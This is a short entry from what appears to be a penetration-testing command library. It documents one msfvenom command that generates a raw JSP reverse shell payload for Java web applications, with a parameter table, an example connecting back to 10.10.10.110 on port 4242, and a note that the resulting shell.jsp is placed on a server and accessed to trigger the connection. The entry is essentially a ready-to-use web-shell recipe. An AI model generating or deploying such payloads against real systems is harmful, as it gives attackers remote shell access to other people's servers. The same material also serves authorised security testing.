---
id: 5283846c-a3ff-4128-9d42-1b1739d1dbe4
name: msfvenom-generate-java-jsp-shell-reverse-tcp-raw
type: command
executor: bash
data: >-
  msfvenom -p java/jsp_shell_reverse_tcp LHOST="$_LHOST" LPORT="$_LPORT" -f raw
  > $_OUTPUT_FILE
output: null
created_at: '2023-04-06T03:56:21.275510+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
platforms:
  - Java
tags:
  - jsp
  - reverse-shell
  - webshell
verified: true
validated: true
---

# msfvenom-generate-java-jsp-shell-reverse-tcp-raw

## Command

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST="$_LHOST" LPORT="$_LPORT" -f raw > $_OUTPUT_FILE
```

## Description

Generates a raw JSP reverse shell payload for Java web applications, injectable into JSP files for remote access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -p java/jsp_shell_reverse_tcp | JSP reverse shell | Yes |
| LHOST="$_LHOST" | IP | Yes |
| LPORT="$_LPORT" | Port | Yes |
| -f raw | Raw JSP code | Yes |
| > $_OUTPUT_FILE | Output (e.g., shell.jsp) | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.jsp
```

## Expected Output

'shell.jsp' with JSP code. Access to trigger connection.

## Related

- [[procedures/Meterpreter-Payload-Generation]]
- [[tools/Metasploit-Framework]]
